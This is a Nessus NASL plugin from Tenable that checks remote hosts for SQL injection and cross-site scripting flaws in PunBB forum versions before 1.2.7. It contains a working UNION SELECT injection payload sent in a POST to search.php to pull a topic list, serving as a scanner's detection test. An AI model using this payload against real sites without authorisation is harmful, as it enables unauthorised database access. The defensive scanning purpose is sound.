#
# (C) Tenable Network Security
# 


if (description) {
  script_id(19705);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-4665");
  script_bugtraq_id(14806, 14808);

  name["english"] = "PunBB < 1.2.7 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis : 

The remote web server contains several PHP scripts that are prone to
SQL injection and cross-site scripting attacks. 

Description :

The version of PunBB installed on the remote host suffers from several
flaws. 

  - Multiple SQL Injection Vulnerabilities
    The application fails to adequately sanitize user-
    supplied input to the 'search_id' parameter of the 
    'search' script as well as an unspecified parameter
    in one of the admin scripts before using it in SQL 
    queries. The first issue can be successfully exploited
    without authentication but does require that PHP's 
    'register_globals' setting be enabled while the 
    second requires an attacker first authenticate as an 
    admin or moderator.

  - A Cross-Site Scripting Vulnerability
    The application also does not sufficiently sanitize 
    input passed in 'url' BBcode tags before using it 
    in a post, which permits cross-site scripting
    attacks such as theft of authentication cookies.

See also :

http://www.securityfocus.com/archive/1/archive/1/422088/100/0/threaded
http://www.securityfocus.com/archive/1/422267/100/0/threaded
http://www.punbb.org/changelogs/1.2.6_to_1.2.7.txt

Solution : 

Upgrade to PunBB 1.2.7 or later.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in PunBB < 1.2.7";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("punBB_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/punBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Check whether the script 'search.php' exists -- it's used in the exploit.
  req = http_get(item:string(dir, "/search.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if (egrep(string:res, pattern:'<form.* method="get" action="search.php">')) {
    # Try to exploit the flaw to return a list of topics.
    postdata = string("search_id=0+UNION+SELECT+'", 'a:5:{s:14:"search_results";s:4:"t.id";s:8:"num_hits";i:9999;s:7:"sort_by";i:0;s:8:"sort_dir";s:4:"DESC";s:7:"show_as";s:6:"topics";}', "'/*");
    req = string(
      "POST ", dir, "/search.php?action=search&keywords=", SCRIPT_NAME, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if it looks like a list of topics.
    if (egrep(string:res, pattern:'<p class="pagelink">Pages:.+search_id=0 UNION SELECT')) {
      security_note(port);
      exit(0);
    }

    # Check the version number in case register_globals is disabled.
    if (ver =~ "^(0\.|1\.([01]\.|2\.[0-6][^0-9]?))") {
      security_note(port);
      exit(0);
    }
  }
}
